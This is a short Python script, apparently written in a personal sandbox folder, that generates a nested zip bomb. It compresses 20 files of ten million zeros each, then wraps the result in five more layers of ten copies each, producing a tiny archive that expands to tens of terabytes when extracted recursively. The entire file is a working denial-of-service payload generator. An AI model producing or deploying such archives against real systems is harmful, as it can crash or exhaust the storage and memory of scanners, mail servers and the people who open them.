
from pathlib import Path
import zipfile
import os

# Set up directories
base = Path.home() / "Documents" / "python_sandbox" / "test"
file_locations = base / "zip_bomb_files"
make_zip_location = base / "zip_bomb_output"
file_locations.mkdir(exist_ok=True, parents=True)
make_zip_location.mkdir(exist_ok=True, parents=True)

# Step 1: Create 20 text files full of zeros
for i in range(20):
    with open(file_locations / f'file_{i}.txt', 'w') as f:
        f.write('0' * 10_000_000)

# Step 2: Zip them into the first layer
layer_0_path = make_zip_location / 'layer_0.zip'
with zipfile.ZipFile(layer_0_path, 'w', zipfile.ZIP_DEFLATED) as zf:
    for i in range(20):
        zf.write(file_locations / f'file_{i}.txt', f'file_{i}.txt')

# Step 3: Create nested layers - zip previous layer 10 times
for layer in range(1, 6):
    input_path = make_zip_location / f'layer_{layer - 1}.zip'
    output_path = make_zip_location / f'layer_{layer}.zip'

    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        for copy in range(10):
            zf.write(input_path, f'copy_{copy}.zip')

# Step 4: Clean up temporary files
final_zip = make_zip_location / 'layer_5.zip'
zip_bomb = base / 'zip_bomb.zip'

# Copy the final layer to the output location
with open(final_zip, 'rb') as src, open(zip_bomb, 'wb') as dst:
    dst.write(src.read())

# Clean up all intermediate files
import shutil
shutil.rmtree(make_zip_location)
shutil.rmtree(file_locations)

print(f"Zip bomb created at: {zip_bomb}")
